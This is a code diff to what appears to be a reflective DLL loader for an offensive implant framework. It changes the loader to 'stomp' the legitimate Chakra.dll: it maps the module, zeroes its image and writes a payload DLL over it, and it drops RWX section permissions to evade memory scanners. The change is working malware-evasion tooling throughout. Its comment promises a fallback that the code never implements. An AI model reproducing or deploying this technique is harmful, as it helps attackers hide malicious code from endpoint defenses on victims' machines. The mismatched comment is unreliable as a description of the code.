@@ -20,9 +20,12 @@ DECLSPEC_IMPORT BOOL    KERNEL32$SetEvent(HANDLE);
 // GetLastError from kernel32.dll for error handling
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError ( void );
 DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
+DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryExA(LPCSTR, HANDLE, DWORD);
 
 // Printf from msvcrt.dll
 DECLSPEC_IMPORT int __cdecl MSVCRT$printf ( const char *, ... );
+DECLSPEC_IMPORT void * __cdecl MSVCRT$memset ( void *, int, size_t );
+
 
 char _DLL_ [0] __attribute__ ( ( section ( "dll" ) ) );
 
@@ -99,9 +102,9 @@ void fix_section_permissions ( DLLDATA * dll, char * dst )
         if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) ) {
             new_protect = PAGE_EXECUTE_READ;
         }
-        if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
-            new_protect = PAGE_EXECUTE_READWRITE;
-        }
+        // if ( ( section_hdr->Characteristics & IMAGE_SCN_MEM_READ ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_WRITE ) && ( section_hdr->Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) {
+        //     new_protect = PAGE_EXECUTE_READWRITE;
+        // }
 
         /* only call VirtualProtect if we have a valid protection and size */
         if ( new_protect != 0 && section_size > 0 ) {
@@ -168,15 +171,16 @@ void go(void)
     DLLDATA dll_data;
     ParseDLL(dll_src, &dll_data);
 
-    char *dll_dst = KERNEL32$VirtualAlloc(
-        NULL,
-        SizeOfDLL(&dll_data),
-        MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN,
-        PAGE_READWRITE
-    );
-
-    MSVCRT$printf ( "[loader] DLL allocated at %p, size=0x%lx\n", dll_dst, SizeOfDLL(&dll_data) );
-
+    /* Try to map the real Chakra.dll and overwrite its image (stomp).
+     * If that fails, fall back to allocating private memory and copy. */
+    char* dll_dst = (char*)KERNEL32$LoadLibraryExA( "Chakra.dll", NULL, DONT_RESOLVE_DLL_REFERENCES );
+    
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_dst;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dll_dst + dos->e_lfanew);
+    DWORD dll_size = nt->OptionalHeader.SizeOfImage;
+    KERNEL32$VirtualProtect( dll_dst, dll_size, PAGE_READWRITE, &old_protect );
+    MSVCRT$memset(dll_dst, 0, dll_size);
+    
     LoadDLL(&dll_data, dll_src, dll_dst);
     
 	ProcessImports(&funcs, &dll_data, dll_dst);
